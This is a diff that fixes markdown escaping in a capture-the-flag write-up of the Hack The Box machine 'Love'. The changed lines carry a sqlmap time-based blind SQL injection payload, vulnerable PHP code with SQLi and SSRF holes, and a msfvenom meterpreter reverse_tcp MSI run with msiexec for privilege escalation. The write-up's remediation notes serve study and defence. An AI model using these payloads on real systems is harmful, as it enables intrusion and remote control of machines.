@@ -116,9 +116,9 @@ PORT     STATE SERVICE      VERSION
 
 |_http\-title: 403 Forbidden
 
-| ssl\-cert: Subject: commonName\=staging.love.htb/organizationName\=ValentineCorp/stateOrProvinceName\=m/countryName\=in
+| ssl\-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
 
-| Issuer: commonName\=staging.love.htb/organizationName\=ValentineCorp/stateOrProvinceName\=m/countryName\=in
+| Issuer: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
 
 | Public Key type: rsa
 
@@ -222,7 +222,7 @@ A common vulnerability among login pages is SQLi, so it makes sense to attempt t
 Upon inputting a SQL query into the username field, an “Incorrect password” message pops up instead of “Cannot find voter with the ID”. Judging from this output, it is likely that this webpage is vulnerable to SQLi.
 
 {% highlight bash %}
-┌─\[0xd4y@Writeup]─\[~/business/hackthebox/easy/windows/love]                                                                                                                 
+┌─[0xd4y@Writeup]─[~/business/hackthebox/easy/windows/love]                                                                                                                 
 
 └──╼ $sqlmap \-r login.burp \--batch \--dump                                                                                                                                  
 
@@ -230,27 +230,27 @@ Upon inputting a SQL query into the username field, an “Incorrect password” 
 
       __H__                                                                                                                                                                
 
-_ __\["]__ __ __  {1.4.10#stable}                                                                                                                                  
+_ __["]__ __ __  {1.4.10#stable}                                                                                                                                  
 
-|_ -| . \["]     | .'| . |                                                                                                                                                  
+|_ -| . ["]     | .'| . |                                                                                                                                                  
 
-\[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state
 
 and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program                                                    
 
-\[\*] starting @ 17:47:39 /2021\-05\-26/                                                                                                                                       
+[\*] starting @ 17:47:39 /2021\-05\-26/                                                                                                                                       
 
-\[17:47:39] \[INFO] parsing HTTP request from 'login.burp'                                                                                                                   
+[17:47:39] [INFO] parsing HTTP request from 'login.burp'                                                                                                                   
 
-\[17:47:40] \[WARNING] provided value for parameter 'login' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
+[17:47:40] [WARNING] provided value for parameter 'login' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
 
-\[17:47:40] \[INFO] resuming back\-end DBMS 'mysql'
+[17:47:40] [INFO] resuming back\-end DBMS 'mysql'
 
-\[17:47:40] \[INFO] testing connection to the target URL                                                                                                                      
+[17:47:40] [INFO] testing connection to the target URL                                                                                                                      
 
-got a 302 redirect to 'http://10.10.10.239:80/index.php'. Do you want to follow? \[Y/n] Y
+got a 302 redirect to 'http://10.10.10.239:80/index.php'. Do you want to follow? [Y/n] Y
 
-redirect is a result of a POST request. Do you want to resend original POST data to a new location? \[Y/n] Y
+redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
 
 sqlmap resumed the following injection point(s) from stored session:                 
 
@@ -262,7 +262,7 @@ Parameter: voter (POST)                                     
 
    Title: MySQL \>= 5.0.12 AND time\-based blind (query SLEEP)
 
-   Payload: voter\=a' AND (SELECT 5793 FROM (SELECT(SLEEP(5)))bSGe) AND 'YMSl'='YMSl&password\=a&login\=
+   Payload: voter=a' AND (SELECT 5793 FROM (SELECT(SLEEP(5)))bSGe) AND 'YMSl'='YMSl&password=a&login=
 
 \---   
 
@@ -270,7 +270,7 @@ Database: votesystem                                       �
 
 Table: admin                                                                                                                                                                
 
-\[1 entry]                                                                                                                                                                   
+[1 entry]                                                                                                                                                                   
 
 +----+--------+----------+--------------------------------------------------------------+----------+-----------+------------+                                               
 
@@ -287,7 +287,7 @@ Using time-based bline SQLi, sqlmap successfully retrieved the contents of the S
 
 #### Admin Page
 
-Along with enumerating the SQL server, the directories of the web service were also enumerated using gobuster[\[1]](#ftnt1):
+Along with enumerating the SQL server, the directories of the web service were also enumerated using gobuster[[1]](#ftnt1):
 
 {% highlight bash %}
 /admin (Status: 301)
@@ -376,7 +376,7 @@ This code can further be inspected using the html source code (inspect element) 
 
      }
 
-   if(isset($_SESSION\['voter'])){
+   if(isset($_SESSION['voter'])){
 
      header('location: home.php');
 
@@ -386,43 +386,43 @@ This code can further be inspected using the html source code (inspect element) 
 
 <?php include 'includes/header.php'; ?>
 
-<body class\="hold-transition login-page"\>
+<body class="hold-transition login-page"\>
 
-<div class\="login-box"\>
+<div class="login-box"\>
 
-     <div class\="login-logo"\>
+     <div class="login-logo"\>
 
          <b>Voting System</b\>
 
      </div\>
 
-     <div class\="login-box-body"\>
+     <div class="login-box-body"\>
 
-       <p class\="login-box-msg"\>Sign in to start your session</p\>
+       <p class="login-box-msg"\>Sign in to start your session</p\>
 
-       <form action\="login.php" method\="POST"\>
+       <form action="login.php" method="POST"\>
 
-             <div class\="form-group has-feedback"\>
+             <div class="form-group has-feedback"\>
 
-               <input type\="text" class\="form-control" name\="voter" placeholder\="Voter's ID" required\>
+               <input type="text" class="form-control" name="voter" placeholder="Voter's ID" required\>
 
-               <span class\="glyphicon glyphicon-user form-control-feedback"\></span\>
+               <span class="glyphicon glyphicon-user form-control-feedback"\></span\>
 
              </div\>
 
-         <div class\="form-group has-feedback"\>
+         <div class="form-group has-feedback"\>
 
-           <input type\="password" class\="form-control" name\="password" placeholder\="Password" required\>
+           <input type="password" class="form-control" name="password" placeholder="Password" required\>
 
-           <span class\="glyphicon glyphicon-lock form-control-feedback"\></span\>
+           <span class="glyphicon glyphicon-lock form-control-feedback"\></span\>
 
          </div\>
 
-             <div class\="row"\>
+             <div class="row"\>
 
-               <div class\="col-xs-4"\>
+               <div class="col-xs-4"\>
 
-                     <button type\="submit" class\="btn btn-primary btn-block btn-flat" name\="login"\><i class\="fa fa-sign-in"\></i> Sign In</button\>
+                     <button type="submit" class="btn btn-primary btn-block btn-flat" name="login"\><i class="fa fa-sign-in"\></i> Sign In</button\>
 
                </div\>
 
@@ -434,19 +434,19 @@ This code can further be inspected using the html source code (inspect element) 
 
      <?php
 
-         if(isset($_SESSION\['error'])){
+         if(isset($_SESSION['error'])){
 
              echo "
 
                  <div class='callout callout-danger text-center mt20'>
 
-                     <p>".$_SESSION\['error']."</p>
+                     <p>".$_SESSION['error']."</p>
 
                  </div>
 
              ";
 
-             unset($_SESSION\['error']);
+             unset($_SESSION['error']);
 
          }
 
@@ -457,7 +457,7 @@ This code can further be inspected using the html source code (inspect element) 
 <?php include 'includes/scripts.php' ?>
 {% endhighlight %}
 
-After enumerating multiple potentially sensitive files, nothing interesting was found. Furthermore, attempts to perform a log injection / poisoning attack[\[2]](#ftnt2) were unsuccessful.  
+After enumerating multiple potentially sensitive files, nothing interesting was found. Furthermore, attempts to perform a log injection / poisoning attack[[2]](#ftnt2) were unsuccessful.  
 Looking back at the Nmap scan, a peculiar HTTP service running on port 5000 was found. However, this service could not be accessed due to the 403 Forbidden error. Nevertheless, due to this file scanner having the functionality of making GET requests, this page could indirectly be accessed through forcing the file scanner to make a request to this service.
 
 ![](/reports/Love/image14.png)
@@ -523,7 +523,7 @@ From the output it can be seen that winPEAS detected a misconfiguration in the A
 
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.14.111 LPORT=9001 -f msi > 0xd4y.msi
 
-After downloading the malicious MSI file onto the box, it is important to start up a multi handler on msfconsole before executing it. Upon downloading the file and setting up the msfconsole listener, the msi file can be executed using the msiexec command (a command responsible for installing, modifying, and performing operations on Windows Installer[\[3]](#ftnt3)):
+After downloading the malicious MSI file onto the box, it is important to start up a multi handler on msfconsole before executing it. Upon downloading the file and setting up the msfconsole listener, the msi file can be executed using the msiexec command (a command responsible for installing, modifying, and performing operations on Windows Installer[[3]](#ftnt3)):
 
 msiexec /quiet /qn /i 0xd4y.msi
 
@@ -542,9 +542,9 @@ SQL Injection
 The SQL injection led to the leakage of the Admin password hash. This was due to the lack of user-input sanitization. The following code snippet was taken from C:\\xampp\\htdocs\\omrs\\login.php, and is running on the root page of http://10.10.10.239:
 
 {% highlight php %}
-if(isset($_POST\['login'])){          
-   $voter = $_POST\['voter'];                                              
-   $password = $_POST\['password'];                                        
+if(isset($_POST['login'])){          
+   $voter = $_POST['voter'];                                              
+   $password = $_POST['password'];                                        
                                
    $sql = "SELECT \* FROM voters WHERE voters_id = '$voter'";              
    $query = $conn->query($sql);
@@ -558,8 +558,8 @@ Beta.php Vulnerability
 The beta.php file located at C:\\xampp\\htdocs\\FFS\\beta.php was responsible for the initial foothold on the box. The code performs the curl function on the user query, but does not first check it for potentially malicious characters or strings:
 
 {% highlight php %}
-if(isset($_POST\['read']))                    
-  {                           $file\=trim($_POST\['file']);         $curl = curl_init();                                                            
+if(isset($_POST['read']))                    
+  {                           $file=trim($_POST['file']);         $curl = curl_init();                                                            
        curl_setopt ($curl, CURLOPT_URL, $file);                    
        curl_exec ($curl);                  
        curl_close ($curl);  
@@ -593,8 +593,8 @@ A vulnerable version of Voting System software was installed which resulted in t
 *   This policy should be changed from 1 to 0
 * * *
 
-[\[1]](#ftnt_ref1) [https://github.com/OJ/gobuster](https://www.google.com/url?q=https://github.com/OJ/gobuster&sa=D&source=editors&ust=1653797783782138&usg=AOvVaw0cPtGGMIRnJTXphEo5G4y6) 
+[[1]](#ftnt_ref1) [https://github.com/OJ/gobuster](https://www.google.com/url?q=https://github.com/OJ/gobuster&sa=D&source=editors&ust=1653797783782138&usg=AOvVaw0cPtGGMIRnJTXphEo5G4y6) 
 
-[\[2]](#ftnt_ref2) [https://owasp.org/www-community/attacks/Log_Injection](https://www.google.com/url?q=https://owasp.org/www-community/attacks/Log_Injection&sa=D&source=editors&ust=1653797783783115&usg=AOvVaw0vjegYg7h-fRsbQvX2GpfN) 
+[[2]](#ftnt_ref2) [https://owasp.org/www-community/attacks/Log_Injection](https://www.google.com/url?q=https://owasp.org/www-community/attacks/Log_Injection&sa=D&source=editors&ust=1653797783783115&usg=AOvVaw0vjegYg7h-fRsbQvX2GpfN) 
 
-[\[3]](#ftnt_ref3) [https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/msiexec](https://www.google.com/url?q=https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/msiexec&sa=D&source=editors&ust=1653797783783679&usg=AOvVaw3LvA2X25v-kmvKWMfYpmG-)
+[[3]](#ftnt_ref3) [https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/msiexec](https://www.google.com/url?q=https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/msiexec&sa=D&source=editors&ust=1653797783783679&usg=AOvVaw3LvA2X25v-kmvKWMfYpmG-)
